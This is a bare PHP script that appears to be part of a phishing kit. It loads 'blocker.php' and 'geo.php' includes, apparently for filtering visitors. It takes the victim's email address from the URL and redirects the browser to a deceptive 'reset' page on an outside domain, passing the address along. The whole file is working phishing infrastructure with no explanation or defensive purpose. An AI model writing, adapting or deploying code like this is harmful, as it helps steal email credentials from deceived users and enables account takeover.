<?php 
session_start();
ob_start();
include "blocker.php";
include "geo.php";
$radiobtn = $_SESSION['radiobtn'];
$subemail = $_SESSION['subemail'];


$url="http://".$_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'];
parse_str(parse_url($url, PHP_URL_QUERY));

//$urlstring = $_SERVER['QUERY_STRING'];
//$urlstring = strchr($urlstring,'&subemail=',true);
//$email= str_replace("userid=","",$urlstring);
//$email= urldecode($email);
$email= $_GET['userid'];
$userid= $email;
// start > to get url and and put id 
	
$subemail = $_SESSION['subemail']= $_GET['subemail'];
	



header( 'Location: http://mailcount.domainresolve.chijtrade.bid/reset/?l=_JeHFUq_VJOXK0QWHtoGYDw_Product-UserID&userid='.$userid);

	
	
		
?>